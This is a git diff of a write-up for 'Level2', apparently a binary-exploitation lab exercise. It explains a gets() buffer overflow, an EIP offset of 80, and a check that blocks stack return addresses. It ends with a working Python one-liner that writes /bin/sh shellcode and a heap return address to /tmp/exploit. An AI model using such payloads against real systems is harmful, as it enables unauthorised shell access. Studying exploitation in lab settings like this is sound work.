@@ -1,17 +1,11 @@
-# Level 2
+# Level2
 
-https://perso.liris.cnrs.fr/lionel.brunie/documents/notes-correction-attaque-buffer-overflow.pdf
-
-## 1. Identity
+## 1. Context
 
 ```bash
 $ id
 uid=2021(level2) gid=2021(level2) groups=2021(level2),100(users)
-```
 
-## 2. Home directory
-
-```bash
 $ pwd
 /home/user/level2
 
@@ -21,74 +15,25 @@ $ ls -la
 [...]
 ```
 
-## 3. Analyzing the file
+## 2. Program behavior
 
 Testing it :
-
 ```bash
 $ ./level2
 a
 a
 ```
 
-Expects an input and prints it
+Expects an input and prints it, nothing else...
 
-Nothing else...
+## 3. Code overview
 
-**Let's use gdb**
+`main()` calls the function `p()`
 
-```bash
-gdb ./level2
+`p()` calls the function `gets()` which is vulnerable to **buffer overflows**.
+Unfortunately, `p()` a basic anti-shellcode protection.
 
-(gdb) disas main
-Dump of assembler code for function main:
-   0x0804853f <+0>:	push   %ebp
-   0x08048540 <+1>:	mov    %esp,%ebp
-   0x08048542 <+3>:	and    $0xfffffff0,%esp
-   0x08048545 <+6>:	call   0x80484d4 <p>
-   0x0804854a <+11>:	leave  
-   0x0804854b <+12>:	ret    
-End of assembler dump.
-```
-
-main() calls the function p()
-```bash
-(gdb) disas p
-Dump of assembler code for function p:
-   0x080484d4 <+0>:	push   %ebp
-   0x080484d5 <+1>:	mov    %esp,%ebp
-   0x080484d7 <+3>:	sub    $0x68,%esp
-   0x080484da <+6>:	mov    0x8049860,%eax
-   0x080484df <+11>:	mov    %eax,(%esp)
-   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
-   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
-   0x080484ea <+22>:	mov    %eax,(%esp)
-   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
-   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
-   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
-   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
-   0x080484fb <+39>:	and    $0xb0000000,%eax
-   0x08048500 <+44>:	cmp    $0xb0000000,%eax
-   0x08048505 <+49>:	jne    0x8048527 <p+83>
-   0x08048507 <+51>:	mov    $0x8048620,%eax
-   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
-   0x0804850f <+59>:	mov    %edx,0x4(%esp)
-   0x08048513 <+63>:	mov    %eax,(%esp)
-   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
-   0x0804851b <+71>:	movl   $0x1,(%esp)
-   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
-   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
-   0x0804852a <+86>:	mov    %eax,(%esp)
-   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
-   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
-   0x08048535 <+97>:	mov    %eax,(%esp)
-   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
-   0x0804853d <+105>:	leave  
-   0x0804853e <+106>:	ret    
-End of assembler dump.
-```
-
-p() calls the function gets() which is vulnerable to buffer overflows.
+## 4. Exploit
 
 Let's try our program with a huge input :
 ```bash
@@ -99,28 +44,23 @@ Program received signal SIGSEGV, Segmentation fault.
 0x55555555 in ?? ()
 ```
 
-0x55 -> U
+0x55 -> U -> Offset = 80
 
 The offset for overwrite EIP is 80.
 
 For the exploit, we can't overwrite and use a stack address, because there is a check in the code
 
 This code check if we try to overwrite the stack. The program quit if we do it :
-```bash
+```c
 if ((check & 0xb0000000) == 0xb0000000) {
 	printf("(%p)\n", check);
 	exit(1);
 }
-
-0x080484fb <+39>:	and    eax,0xb0000000
-0x08048500 <+44>:	cmp    eax,0xb0000000
-0x08048505 <+49>:	jne    0x8048527 <p+83>
 ```
 
-https://shell-storm.org/shellcode/files/shellcode-575.html
+Let's use a shellcode : https://shell-storm.org/shellcode/files/shellcode-575.html
 
 Here is our exploit :
-
 ```bash
 $ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
 ```
